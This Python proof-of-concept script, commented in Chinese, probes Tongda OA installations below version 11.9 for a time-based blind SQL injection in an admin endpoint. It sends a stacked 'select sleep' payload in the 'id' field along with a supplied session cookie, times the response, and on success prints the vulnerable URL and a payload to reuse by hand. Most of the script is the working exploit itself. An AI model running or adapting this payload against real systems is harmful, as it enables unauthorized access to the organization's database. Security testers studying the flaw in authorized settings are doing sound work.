import requests
import sys
import time
import datetime

def sql_time_injection(target_url,cookie): # 通达11.9后台SQL注入 注意请求的/
    # target_url = 'http://10.30.1.52/'
    # cookie = 'USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=fue464ee3df7hrtlili6ll5h33; SID_1=efa39e63'
    url = target_url + "general/appbuilder/web/portal/workbench/upsharestatus"
    # print(url)
    data = {'uid':'1','status':'1','id':'1;select sleep(3)'}
    headers = {'Cookie': cookie}
    try:
        time1 = datetime.datetime.now()
        response = requests.post(url=url,data=data,headers=headers)
        # print(response.text)
        time2 = datetime.datetime.now()
        sec = (time2-time1).seconds
        if "操作成功" in response.text and sec == 3:
            print('[*] 存在时间盲注漏洞')
            print('自行登录后台抓包填入如下')
            print('目标URL地址为:' + url)
            print('POST值为: ' + 'uid=1&status=1&id=1;select sleep(4)')
        else:
            print("[-] 不存在该漏洞")
    except:
        pass

if __name__ == '__main__':
    print('[->] 正在测试通达<11.9后台SQL时间盲注漏洞')
    host = input("请输入目标URL地址：")
    cookie = input("请输入目标cookie，模板为PHPSESSID=xxx：")
    sql_time_injection(host, cookie)